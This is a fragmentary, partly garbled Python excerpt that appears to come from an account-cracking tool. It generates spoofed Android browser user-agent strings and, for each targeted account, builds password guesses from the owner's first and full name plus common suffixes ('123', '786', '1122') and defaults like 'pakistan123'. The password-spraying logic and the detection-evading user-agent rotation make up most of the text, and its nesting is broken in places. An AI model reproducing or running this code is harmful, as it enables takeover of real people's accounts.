...
for agenkuw in range(100):
	...
	c='CPH2109','Samsung Galaxy J7','Nokia C21','LG G7'
	z='Build/MMB29M','Build/LMY47V','Build/MMB29K','Build/TKQ1.220807.001; wv','Build/RP1A.200720.012; wv'
	...
	uakuh=f'{a} {b}; {c} {z} {d}{e}.{f}.{g}.{h} {i}'
	uaa.append(uakuh)
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12'])
	c='MI 9T','LG-H815','Google 3XL','Oppo A74','ONEPLUS A5010','SM-C5000','moto g power (2022)'
	z='Build/QKQ1.191014.012; wv','Build/LMY47X','Build/OPM6.171019.030.K1','Build/SKYW1905210OS01MP2; wv','Build/PQ3B.190801.002; wv'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
		...
		for tamsis in id:
			...
			if len(nama)<5:
				if len(awal)<3:pwx=['pakistan','pakistan123','pakistan12345']
					...
					else:pwx=[awal+'1122',full+'1',full+'12',full+'123',full+'1234',full+'12345',full+'786',full+'1122',awal+'786',awal+'1234',awal+'12345','pakistan','pakistan123']
			else:
				if len(awal)>9:pwx=['pakistan','pakistan123','pakistan12345']
				else:pwx=[awal+'1122',full+'1',full+'12',full+'123',full+'1234',full+'12345',full+'786',full+'1122',awal+'786',nama,'pakistan','pakistan123','pakistan12345','sayang',awal+'123',awal+'1234',awal+'12345']
		...
		for tamsis in id:
			...
			if len(nama)<5:
				if len(awal)<3:pwx=['pakistan','pakistan123','pakistan12345']
					...
					if len(awal)>9:pwx=['pakistan','pakistan123','pakistan12345']
					else:pwx=[awal+'1122',full+'1',full+'12',full+'123',full+'1234',full+'12345',full+'786',full+'1122',awal+'786',awal+'123',awal+'1234',awal+'12345','pakistan','pakistan123','pakistan12345']
			else:
				if len(awal)>9:pwx=['pakistan','pakistan123','pakistan12345']
